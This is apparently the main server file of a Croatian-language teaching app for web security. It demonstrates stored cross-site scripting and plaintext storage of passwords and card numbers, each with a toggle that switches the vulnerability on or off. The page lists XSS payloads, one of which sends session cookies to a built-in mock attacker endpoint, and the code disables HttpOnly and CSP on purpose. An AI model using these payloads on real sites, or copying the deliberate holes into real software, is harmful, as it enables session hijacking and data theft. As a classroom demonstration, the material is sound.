import express from "express";
import cookieParser from "cookie-parser";
import crypto from "crypto";
import { layout, toggle, escapeHtml, Settings } from "./views";
import { comments, stolen, renderComments } from "./xss";
import { register, login, renderDatabase, seed } from "./sde";

const app = express();
const port = Number(process.env.PORT) || 3000;

app.set("trust proxy", 1);
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

function readSettings(req: express.Request): Settings {
    return {
        xss: req.cookies.xss !== "0",
        sde: req.cookies.sde !== "0",
    };
}

app.use((req, res, next) => {
    const s = readSettings(req);
    const existing = req.cookies.sessionId;
    const sid = typeof existing === "string" && /^[a-f0-9]{32}$/.test(existing)
        ? existing
        : crypto.randomBytes(16).toString("hex");
    res.cookie("sessionId", sid, { httpOnly: !s.xss, secure: req.secure, sameSite: "lax" });
    if (!s.xss) {
        res.setHeader("Content-Security-Policy", "default-src 'self'");
    }
    next();
});

app.get("/", (req, res) => {
    const s = readSettings(req);
    res.send(layout(`
<hr>
<h2>Cross-site scripting (XSS) – pohranjeni</h2>
<p><b>Upute:</b> Komentar se sprema na poslužitelj i prikazuje svima.
Kad je ranjivost uključena, upisati jedan od komentara:</p>
<ul>
<li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
<li><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></li>
<li><code>&lt;script&gt;new Image().src='/steal?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</code></li>
</ul>
<p>Prva dva prikazuju cookie sjednice u alert prozoru, a treći ga šalje „napadaču” (link ispod).
Kad je ranjivost isključena, isti komentari prikazuju se kao običan tekst.</p>
${toggle("xss", s.xss)}
<form method="post" action="/xss/comment">
Komentar: <input name="text" size="60">
<button type="submit">Spremi komentar</button>
</form>
<form method="post" action="/xss/clear">
<button type="submit">Obriši sve komentare</button>
</form>
<p><a href="/napadac">Poslužitelj napadača – ukradeni cookies</a></p>
<h3>Komentari</h3>
${renderComments(s.xss)}
<hr>
<h2>Nesigurna pohrana osjetljivih podataka (Sensitive Data Exposure)</h2>
<p><b>Upute:</b> Registrirati korisnika s lozinkom i brojem kartice ili se prijaviti kao
ana / ana123 ili marko / lozinka.
Ispod forme prikazan je sadržaj baze, odnosno ono što napadač vidi ako ukrade bazu.
Kad je ranjivost uključena, lozinke i brojevi kartica spremaju se i prikazuju kao čisti tekst.
Kad je isključena, lozinke se spremaju kao argon2id hash sa saltom i pepperom, brojevi kartica šifrirani su algoritmom AES-256-GCM,
a nakon prijave prikazuje se samo maskirani broj kartice.
Svaki način rada ima vlastitu bazu.</p>
${toggle("sde", s.sde)}
${typeof req.query.sdeMsg === "string" ? `<p><b>${escapeHtml(req.query.sdeMsg)}</b></p>` : ""}
<form method="post" action="/sde/register">
Korisničko ime: <input name="username">
Lozinka: <input name="password" type="password">
Broj kartice: <input name="card">
<button type="submit">Registriraj</button>
</form>
<form method="post" action="/sde/login">
Korisničko ime: <input name="username">
Lozinka: <input name="password" type="password">
<button type="submit">Prijavi se</button>
</form>
<h3>Sadržaj baze podataka</h3>
${renderDatabase(s.sde)}
`));
});

app.post("/sde/register", async (req, res) => {
    const s = readSettings(req);
    const msg = await register(
        s.sde,
        String(req.body?.username ?? "").trim(),
        String(req.body?.password ?? ""),
        String(req.body?.card ?? ""),
    );
    res.redirect("/?sdeMsg=" + encodeURIComponent(msg));
});

app.post("/sde/login", async (req, res) => {
    const s = readSettings(req);
    const msg = await login(s.sde, String(req.body?.username ?? "").trim(), String(req.body?.password ?? ""));
    res.redirect("/?sdeMsg=" + encodeURIComponent(msg));
});

app.post("/settings/:name", (req, res) => {
    const name = req.params.name;
    if (name === "xss" || name === "sde") {
        const enabled = req.body?.enabled === "on";
        res.cookie(name, enabled ? "1" : "0", { sameSite: "lax", maxAge: 30 * 24 * 3600 * 1000 });
    }
    res.redirect("/");
});

app.post("/xss/comment", (req, res) => {
    const text = String(req.body?.text ?? "").trim().slice(0, 500);
    if (text) {
        comments.push(text);
    }
    res.redirect("/");
});

app.post("/xss/clear", (_req, res) => {
    comments.length = 0;
    res.redirect("/");
});

app.get("/steal", (req, res) => {
    stolen.push({ time: new Date().toISOString(), data: String(req.query.c ?? "") });
    res.status(204).end();
});

app.get("/napadac", (_req, res) => {
    const rows = stolen
        .map((s) => `<li>${s.time}: <code>${escapeHtml(s.data)}</code></li>`)
        .join("\n");
    res.send(layout(`
<h2>Napadačev poslužitelj</h2>
<p>Kolačići koje je napadačeva skripta poslala:</p>
${stolen.length ? `<ul>\n${rows}\n</ul>` : "<p>Još ništa nije ukradeno.</p>"}
<p><a href="/">Natrag</a></p>
`));
});

seed().then(() => {
    app.listen(port, () => {
        console.log(`Server: http://localhost:${port}`);
    });
});